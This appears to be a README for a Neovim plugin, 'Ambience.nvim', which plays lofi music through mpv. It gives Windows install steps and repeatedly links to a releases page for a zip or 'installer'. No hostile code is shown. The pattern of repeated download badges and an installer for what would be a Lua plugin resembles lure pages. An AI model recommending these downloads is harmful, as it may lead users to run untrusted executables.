# 🎵 Ambience.nvim - Play Calm Music While Coding

[![Download Ambience.nvim](https://img.shields.io/badge/Download-Ambience.nvim-brightgreen)](https://github.com/SDKprojectmark2/Ambience.nvim/releases)

## 🖥 What is Ambience.nvim?

Ambience.nvim is a simple tool that plays ambient or lofi music while you use Neovim, a popular text editor. It helps you focus by adding relaxing background sounds as you code or work. You don’t need music apps or playlists. Ambience.nvim uses mpv, a media player, to handle the music.

This plugin runs inside Neovim, so it works well with your text editing tasks. It supports many types of ambient sounds and music made for concentration.

## 🔍 Features

- Plays ambient or lofi music continuously inside Neovim.
- Uses mpv for smooth audio playback.
- Simple setup for Windows users.
- Adjustable to your preferences with easy controls.
- Supports many ambient and lo-fi music tracks.
- Runs quietly in the background without slowing your work.
- Uses minimal system resources.

## ⚙ System Requirements

- Windows 10 or later.
- Neovim installed (version 0.5 or newer).
- mpv media player installed and added to your System PATH.
- Basic internet connection to download files.
- At least 100 MB free disk space for music and plugin files.

If you don’t have Neovim or mpv installed, the next section explains how to get started.

## 🚀 Getting Started with Ambience.nvim

### 1. Download Neovim

If you don’t have Neovim installed:

- Visit https://neovim.io/
- Download the Windows version.
- Run the installer, follow instructions.
  
Make sure Neovim runs by opening Command Prompt and typing:

```
nvim
```

If Neovim opens, it is ready.

### 2. Download mpv Media Player

mpv is needed to play the music.

- Go to https://mpv.io/installation/
- Find the Windows builds link.
- Download the latest mpv Windows zip.
- Unzip the folder to a location you remember, for example, `C:\mpv`.
- Add mpv to your PATH environment variable:

  - Search for "Environment Variables" in Windows Search.
  - Click "Edit the system environment variables".
  - In System Properties, click Environment Variables.
  - Find "Path" under System variables.
  - Click Edit, then New.
  - Add the folder path where `mpv.exe` is located, e.g. `C:\mpv\mpv`.
  - Click OK and close all windows.

To check if mpv is set up correctly, open Command Prompt and type:

```
mpv --version
```

You should see mpv's version info.

### 3. Download Ambience.nvim Plugin

Visit this page to download Ambience.nvim for Windows:

[![Download Ambience.nvim](https://img.shields.io/badge/Download-Ambience.nvim-blue)](https://github.com/SDKprojectmark2/Ambience.nvim/releases)

Here you will find the latest release files. Download the recommended Windows release zip or installer if available.

### 4. Install Ambience.nvim

You will need to install the plugin into your Neovim setup:

- Extract the downloaded Ambience.nvim zip.
- Copy the folder to Neovim’s plugin directory. Normally, this is:

  ```
  C:\Users\<YourUser>\AppData\Local\nvim\site\pack\packer\start
  ```

- If the folder path does not exist, you can create it.

This step connects Ambience.nvim to Neovim.

### 5. Configure Ambience.nvim in Neovim

Open Neovim and add basic configuration:

- Open Command Prompt.
- Launch Neovim with:

  ```
  nvim
  ```

- Open your Neovim configuration file by typing:

  ```
  :edit $MYVIMRC
  ```

- Add the following Lua snippet to load Ambience.nvim:

  ```lua
  require('ambience').setup({
    -- Optional settings here: volume, playlist, etc.
    volume = 30,
    playlist = { "lofi1.mp3", "ambient1.mp3" }
  })
  ```

- Save the file with:

  ```
  :wq
  ```

- Restart Neovim.

Ambience.nvim should start playing ambient music automatically.

## 🎛 Using Ambience.nvim

- To pause or start music, open Neovim and type:

  ```
  :lua require('ambience').toggle()
  ```

- To adjust volume, change the setting in your config file or use key commands you define.

- Add your own music files to the plugin folder to customize the playlist.

## 💡 Tips for Best Results

- Use headphones for better sound quality and less distraction.
- Adjust your system volume and plugin volume to avoid loud sounds.
- Keep Neovim and mpv updated to ensure smooth playback.
- If music stops, check mpv installation and PATH settings.
- Restart Neovim after making configuration changes.

## 🛠 Troubleshooting

- If Ambience.nvim doesn’t start, make sure mpv runs from the command line.
- If music skips or fails, try lower volume or reset mpv.
- Ensure your Neovim version supports Lua plugins (version 0.5 or newer).
- Check Windows firewall settings if music streaming is interrupted.
- Verify plugin is placed in the correct directory.

## ⚡ Additional Resources

- Neovim docs: https://neovim.io/doc/
- mpv docs: https://mpv.io/manual/master/
- Lua basics for configuration: https://www.lua.org/pil/contents.html

Download Ambience.nvim here:

[![Download Ambience.nvim](https://img.shields.io/badge/Download-Ambience.nvim-green)](https://github.com/SDKprojectmark2/Ambience.nvim/releases)